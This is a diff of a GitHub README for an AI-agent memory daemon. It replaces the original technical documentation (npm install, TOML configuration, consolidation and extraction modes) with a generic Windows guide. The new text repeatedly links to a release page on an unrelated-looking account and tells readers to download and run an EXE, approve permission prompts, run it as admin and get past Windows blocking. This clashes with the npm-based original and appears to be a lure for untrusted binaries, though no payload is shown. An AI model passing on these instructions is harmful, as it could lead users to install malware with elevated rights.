@@ -1,198 +1,221 @@
-# Open-source memory manager daemon for AI agents
+# 🤖 agent-memory-daemon - Keep Agent Memory Organized
 
-Open-source memory consolidation and extraction daemon for AI agents. Filesystem-native, LLM-pluggable, framework-agnostic.
+[![Download agent-memory-daemon](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Charlesfrederickmenningerdateplum166/agent-memory-daemon/releases)
 
-Agents feed it raw observations as markdown files; the daemon runs two complementary modes:
+## 📦 What this app does
 
-- **Consolidation** — periodically reorganizes, deduplicates, and prunes existing memory files via a four-phase pass (orient → gather → consolidate → prune)
-- **Extraction** — watches for new session content and runs an LLM pass to identify facts, decisions, preferences, and error corrections worth remembering, writing them as individual memory files
+agent-memory-daemon is a memory manager for AI agents. It helps an agent save, find, and update memory files on your computer.
 
-The filesystem is the interface — no SDK, no API, no MCP required. The LLM backend is pluggable (OpenAI, Amazon Bedrock, or anything with a chat API).
+It works with tools and agents that can write files, including OpenClaw, Strands, LangChain, and AgentCore Runtime. It also works with other agent setups that use local files for memory.
 
-memconsolidate is a standalone, agent-agnostic daemon — available to anyone building with OpenClaw, Strands, LangChain, or any custom agent framework.
+This app is useful if you want your agent to keep track of:
+- past chats
+- task notes
+- long-term facts
+- project context
+- saved decisions
+- reusable memory files
 
-## How it works
+## 🖥️ Before you start
 
-### Consolidation (reorganize existing memories)
+Use this app on a Windows PC. You only need a normal computer and internet access to get the file.
 
-1. Agents write markdown memory files (with YAML frontmatter) to a watched directory
-2. A three-gate trigger system (time elapsed + session count + lock) decides when to consolidate
-3. The daemon runs a four-phase pass: orient → gather → consolidate → prune
-4. The result is organized, deduplicated, size-budgeted memory with a concise MEMORY.md index
+You should also have:
+- enough disk space for the app and memory files
+- permission to run downloaded apps
+- a folder where the daemon can store memory
 
-### Extraction (discover new memories from sessions)
+If you plan to connect it to another agent tool, make sure that tool can read and write files on your PC.
 
-1. The daemon tracks a cursor (`.extraction-cursor`) — the timestamp of the last extraction
-2. On each poll, it scans the session directory for files modified since the cursor
-3. If new content is found, it builds a prompt containing the current memory manifest + session content
-4. The LLM identifies facts, decisions, preferences, and corrections worth remembering
-5. Valid operations are applied to the memory directory and the MEMORY.md index is updated
-6. The cursor advances on success; on failure it stays put so the same content is retried
+## 🚀 Download the app
 
-Consolidation takes priority — if both triggers fire on the same tick, consolidation runs first and extraction waits for the next cycle. A shared PID-based lock ensures they never run concurrently.
+Visit the release page here:
 
-## Key design goals
+[Download agent-memory-daemon from GitHub Releases](https://github.com/Charlesfrederickmenningerdateplum166/agent-memory-daemon/releases)
 
-- **Agent-agnostic**: any agent that can write a file can use it — OpenClaw, Strands, LangChain, custom agents, raw LLM calls
-- **Language-agnostic**: filesystem is the interface — no SDK required
-- **LLM-pluggable**: bring your own model (OpenAI, Amazon Bedrock, or any chat API)
-- **Two modes, one daemon**: consolidation and extraction run in the same process with mutual exclusion
-- **Size-budgeted**: MEMORY.md index stays under 200 lines / 25 KB
-- **Concurrent-safe**: PID-based lock file prevents corruption from parallel runs
-- **Observable**: structured JSON-line logs with duration, prompt size, and operation metrics
-- **Dry-run mode**: preview what either mode would change without writing anything
+On that page:
+1. Find the latest release
+2. Look under **Assets**
+3. Download the Windows file
+4. Save it in a folder you can find again
 
-## Quick start
+If the file comes as a ZIP, extract it first. If it comes as an EXE, you can run it after the download finishes.
 
-### Install
+## 🛠️ Install on Windows
 
-```bash
-npm install agent-memory-daemon
-```
+Follow these steps in order:
 
-Or run directly with npx:
+1. Open the folder where you saved the download
+2. If the file is zipped, right-click it and choose **Extract All**
+3. Open the extracted folder
+4. Find the main app file
+5. Double-click the file to start it
 
-```bash
-npx agent-memory-daemon init
-npx agent-memory-daemon start
-```
+If Windows asks for permission, choose **Yes** to let it run.
 
-### Configure
+If the app opens in a console window, leave that window open while you use the daemon.
 
-```toml
-memory_directory = "./memory"
-session_directory = "./sessions"
-min_hours = 24
-min_sessions = 5
+## 🧭 First-time setup
 
-# Enable extraction mode (off by default)
-extraction_enabled = true
-extraction_interval_ms = 60000        # minimum 10000
-max_extraction_session_chars = 5000
+When the app starts for the first time, it will need a place to store memory.
 
-[llm_backend]
-name = "bedrock"          # or "openai"
-region = "us-east-1"
-profile = "default"
-model = "us.anthropic.claude-sonnet-4-20250514-v1:0"
-```
+Use a folder like this:
+- `C:\agent-memory`
+- `C:\Users\YourName\Documents\agent-memory`
 
-### Run
+Keep the folder simple and easy to find.
 
-```bash
-npx agent-memory-daemon start
-```
+If the app asks for a memory path:
+1. Choose your memory folder
+2. Confirm the choice
+3. Wait for the app to finish setup
 
-Or if installed globally / as a project dependency:
+If you use another agent app, point that app to the same folder. That way both tools can work with the same memory files.
 
-```bash
-agent-memory-daemon start
-```
+## 🔗 Connect it to your agent
 
-The daemon polls on a configurable interval. Ctrl+C for graceful shutdown.
+agent-memory-daemon works with any agent that can write a file.
 
-## Integration with agent frameworks
+Common setups include:
+- OpenClaw
+- Strands
+- LangChain
+- AgentCore Runtime
+- custom agent scripts
 
-The integration pattern is the same regardless of framework — your agent writes session notes, memconsolidate consolidates them in the background, and your agent reads the organized memories at startup.
+To connect it:
+1. Start agent-memory-daemon
+2. Set the memory folder in your agent tool
+3. Make sure both tools use the same local path
+4. Send a test note or task to the agent
+5. Check that a memory file appears in the folder
 
-**OpenClaw**: Point `session_directory` at your OpenClaw workspace's transcript directory. memconsolidate consolidates what the agent accumulates.
+If your agent supports a file path or local storage setting, use that path for memory.
 
-**Strands / LangChain**: After each agent run, append a session summary to the sessions directory. At startup, read `MEMORY.md` + topic files into your agent's system prompt.
+## 🗂️ How it stores memory
 
-**Raw LLM calls**: Same pattern — dump session artifacts as markdown, read the memory index before each conversation.
+This daemon keeps memory in files on your computer. That makes it simple to inspect, back up, and move.
 
-## Configuration reference
+A memory folder may hold:
+- short notes
+- task history
+- fact files
+- session records
+- summary files
+- agent context files
 
-All keys use `snake_case` in TOML and are mapped to `camelCase` internally.
+Because the storage is filesystem-native, you can open the files with Notepad or any text editor.
 
-### Consolidation settings
+## 🔧 Common uses
 
-| Key | Default | Description |
-|---|---|---|
-| `memory_directory` | `./memory` | Path to the memory file directory |
-| `session_directory` | `./sessions` | Path to the session file directory |
-| `min_hours` | `24` | Minimum hours since last consolidation before triggering |
-| `min_sessions` | `5` | Minimum session files required to trigger |
-| `poll_interval_ms` | `60000` | How often the daemon checks triggers (ms) |
-| `min_consolidation_interval_ms` | `300000` | Minimum ms between consolidation passes |
-| `max_session_content_chars` | `2000` | Max chars per session file included in the prompt |
-| `max_memory_content_chars` | `4000` | Max chars per memory file included in the prompt |
-| `max_index_lines` | `200` | MEMORY.md line budget |
-| `max_index_bytes` | `25000` | MEMORY.md size budget |
-| `stale_lock_threshold_ms` | `3600000` | Lock age before it's considered stale |
-| `dry_run` | `false` | Preview changes without writing files |
+Use agent-memory-daemon when you want:
+- a local memory store for an AI agent
+- a simple way to keep context between sessions
+- file-based memory that does not depend on one framework
+- a shared memory path across tools
+- better control over saved agent data
 
-### Extraction settings
+It fits well in setups where the agent already uses files as part of its workflow.
 
-| Key | Default | Description |
-|---|---|---|
-| `extraction_enabled` | `false` | Enable the extraction mode |
-| `extraction_interval_ms` | `60000` | Minimum ms between extraction passes (min: 10000) |
-| `max_extraction_session_chars` | `5000` | Max chars of session content included in the extraction prompt |
+## 🧪 Check that it works
 
-### LLM backend
+After setup, run a quick test:
 
-```toml
-[llm_backend]
-name = "bedrock"          # "bedrock" or "openai"
-region = "us-east-1"      # Bedrock only
-profile = "default"       # Bedrock only (AWS profile)
-model = "us.anthropic.claude-sonnet-4-20250514-v1:0"
-# api_key = "${OPENAI_API_KEY}"  # OpenAI only
-```
+1. Start the daemon
+2. Send your agent a short task
+3. Ask it to save one fact or note
+4. Open the memory folder
+5. Look for a new file or updated file
 
-## Extraction in detail
+If you see the file change, the setup is working.
 
-Extraction identifies new knowledge from agent sessions and writes it as structured memory files. It's designed to run frequently (every 60 seconds by default) with low overhead — only modified session files are processed.
+## 🧰 Basic troubleshooting
 
-### What it extracts
+If the app does not start:
+- run it again as an admin
+- check that the download finished fully
+- make sure Windows did not block the file
 
-The LLM is instructed to look for:
-- **Facts** — concrete information about the project, codebase, or environment
-- **Decisions** — architectural choices, tool selections, approach decisions
-- **Preferences** — user coding style, tool preferences, workflow habits
-- **Error corrections** — things that were wrong before and are now corrected
+If your agent cannot find memory:
+- confirm both tools use the same folder
+- check the folder path for typos
+- make sure the daemon is running
+- check that the folder has write access
 
-### How the cursor works
+If files are not saving:
+- use a folder inside your user account
+- avoid protected system folders
+- check that the disk is not full
 
-The `.extraction-cursor` file in the memory directory contains a millisecond timestamp. On each poll:
+If the app opens and closes fast:
+- run it from a terminal or console window
+- look for an error message
+- download the latest release again
 
-1. Session files with `mtime > cursor` are collected
-2. If any are found, extraction runs
-3. On success, the cursor advances to the current time
-4. On failure, the cursor stays put — the same files will be retried next cycle
+## 📁 Suggested folder layout
 
-If the cursor file is missing (first run), all session files are processed.
+A simple folder layout helps keep things clear:
 
-### Mutual exclusion
+- `agent-memory`
+  - `sessions`
+  - `notes`
+  - `summaries`
+  - `facts`
+  - `archive`
 
-Consolidation and extraction share the same PID-based lock and never run concurrently. The daemon enforces this with boolean flags (`consolidating` / `extracting`) checked at the top of each poll cycle. Consolidation always takes priority.
+This is not required, but it helps keep memory organized as the agent grows.
 
-### Log events
+## 🔒 Privacy and local data
 
-| Event | When |
-|---|---|
-| `daemon:extraction-start` | Extraction pass begins |
-| `daemon:extraction-complete` | Extraction pass finishes successfully |
-| `daemon:extraction-failed` | Extraction pass fails |
+This app stores memory on your own computer unless you connect it to another system.
 
-## How does this compare to OpenClaw's memory system?
+That gives you direct control over:
+- saved files
+- folder access
+- backups
+- cleanup
+- retention
 
-Both projects use markdown files on disk for agent memory, but they solve different problems at different layers.
+If you want to reset the memory, delete the files in the memory folder and start fresh.
 
-**OpenClaw** is a full personal AI assistant with a built-in memory subsystem. Its memory system focuses on *retrieval* — hybrid search (BM25 + vector similarity) so the agent can recall relevant memories during a conversation. Memories are written in real-time during sessions (manual saves, pre-compaction flush, session hooks). There's a community `memory-organizer` skill for manual cleanup, but no automated background consolidation.
+## 📌 Example workflow
 
-**memconsolidate** is a standalone daemon that focuses on *curation*. It runs independently of any agent, periodically reviewing and reorganizing the memory directory using an LLM. It merges duplicates, converts relative dates to absolute, removes contradicted facts, and keeps the index within a size budget. Any agent in any language can drop `.md` files into the directory — memconsolidate handles the housekeeping.
+A simple workflow looks like this:
 
-| | OpenClaw | memconsolidate |
-|---|---|---|
-| What it is | Full AI assistant with memory plugin | Standalone consolidation + extraction daemon |
-| Core focus | Memory retrieval (search) | Memory curation (consolidation) + discovery (extraction) |
-| When memories are organized | Manually or at compaction | Automatically via background daemon |
-| When new memories are created | Agent writes during chat | Extraction mode discovers them from session files |
-| Search capabilities | Hybrid vector + BM25 | Not in scope |
-| Agent coupling | Plugin inside OpenClaw runtime | Agent-agnostic, filesystem interface |
-| Trigger mechanism | User-initiated or compaction threshold | Time + session count + lock gates (consolidation), cursor + mtime (extraction) |
-| LLM usage for memory | Agent writes memories during chat | Separate LLM calls for consolidation and extraction |
+1. Start agent-memory-daemon
+2. Open your agent tool
+3. Point it to the same memory folder
+4. Ask the agent to save a task detail
+5. Continue the session later
+6. Let the agent read the stored memory again
 
-They're complementary — you could point memconsolidate at an OpenClaw workspace's `memory/` directory and let it periodically clean up what the agent accumulates.
+This lets the agent keep context across runs without relying on a closed platform.
+
+## 🧾 File notes
+
+The exact file names may change by release, but the app is built to work as a local memory daemon for agents. If you see config files, memory files, or session files, that is expected.
+
+If you want to keep your setup tidy:
+- use one folder for one agent
+- back up the folder once in a while
+- delete old files you no longer need
+
+## 🧩 Supported use cases
+
+agent-memory-daemon is a good fit for:
+- personal AI assistants
+- coding agents
+- research helpers
+- workflow agents
+- file-based agent systems
+- multi-agent setups that share memory
+
+It also works well when you need memory that stays on the same machine.
+
+## 📥 Download again later
+
+If you need a newer build or want to reinstall, use the release page again:
+
+[Open the GitHub Releases page](https://github.com/Charlesfrederickmenningerdateplum166/agent-memory-daemon/releases)
+
+From there, choose the latest Windows file and run it on your PC
